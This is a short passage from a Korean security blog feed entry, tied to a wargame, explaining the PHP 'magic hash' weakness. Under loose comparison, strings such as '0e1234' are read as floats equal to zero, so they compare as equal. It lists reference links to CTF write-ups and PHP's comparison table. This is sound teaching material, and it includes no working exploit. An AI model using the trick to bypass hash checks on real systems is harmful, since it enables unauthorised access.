<h3 id="magic-hash">Magic Hash</h3>
<ul>
  <li><code class="language-plaintext highlighter-rouge">0e1234</code> 문자열을 이용하여 비교를 하면 php 에서는 float 형식으로 인식하게 된다.</li>
  <li>즉 0e 로 시작하고 뒤에 모두 숫자가 오는 문자열을 이용하여 비교를 하면 float 형식으로 인식하게된다.</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0e2 == 0*10^2 == 0
즉 0을 비교하는 것이랑 같은 효과를 발생한다.
</code></pre></div></div>

<h2 id="참고-사이트">참고 사이트</h2>
<ul>
  <li><a href="https://t-okk.tistory.com/27">HackCTF Web 마법봉 (매직해시 취약점) (tistory.com)</a></li>
  <li><a href="http://php.adamharvey.name/manual/kr/types.comparisons.php">PHP: PHP 자료형 비교표 - Manual (adamharvey.name)</a></li>
  <li><a href="https://comsec.tistory.com/86">HackCTF  Hash  :: 보안 한 걸음 (tistory.com)</a></li>
  <li><a href="https://acloit.tistory.com/entry/%EB%A7%A4%EC%A7%81%ED%95%B4%EC%8B%9C">매직해시 (tistory.com)</a></li>
</ul>]]></content><author><name>Jung MinGyu</name></author><category term="dreamhack" /><category term="wargame" /><category term="php" /><category term="비교연산자" /><summary type="html"><![CDATA[PHP 비교연산자 취약점에 대하여 알아보자.]]></summary></entry></feed>